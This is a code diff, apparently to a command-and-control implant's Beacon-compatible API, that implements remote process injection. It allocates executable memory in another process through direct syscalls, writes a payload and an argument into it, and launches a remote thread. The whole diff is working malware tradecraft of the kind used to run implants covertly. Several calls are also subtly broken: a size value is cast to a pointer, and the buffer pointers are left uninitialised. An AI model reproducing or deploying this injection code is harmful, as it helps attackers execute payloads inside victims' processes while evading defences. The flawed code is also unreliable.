@@ -417,7 +417,36 @@ VOID BeaconInjectProcess( HANDLE hProc, int pid, char* payload, int p_len, int p
 
 VOID BeaconInjectTemporaryProcess( PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len )
 {
-    
+    PVOID p_RemoteBuf;
+    PVOID a_RemoteBuf;
+    SIZE_T Size;
+    NTSTATUS Status;
+
+    // allocate memory space for payload
+    Size = p_len * sizeof(char);
+    Status = Instance->Syscall.NtAllocateVirtualMemory(pInfo->hProcess, &p_RemoteBuf, 0, (PULONG)Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    if (Status != STATUS_SUCCESS) {
+        return;
+    }
+
+    Status = Instance->Syscall.NtWriteVirtualMemory(pInfo->hProcess, p_RemoteBuf, (PVOID)payload, Size, 0);
+    if (Status != STATUS_SUCCESS) {
+        return;
+    }
+
+    // allocate memory space for argument
+    Size = a_len * sizeof(char);
+    Status = Instance->Syscall.NtAllocateVirtualMemory(pInfo->hProcess, &a_RemoteBuf, 0, (PULONG)Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    if (Status != STATUS_SUCCESS) {
+        return;
+    }
+
+    Status = Instance->Syscall.NtWriteVirtualMemory(pInfo->hProcess, a_RemoteBuf, (PVOID)arg, Size, 0);
+    if (Status != STATUS_SUCCESS) {
+        return;
+    }
+
+    Instance->Syscall.NtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, pInfo->hProcess, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, NULL, NULL, NULL, NULL);
 }
 
 VOID BeaconCleanupProcess( PROCESS_INFORMATION* pInfo )
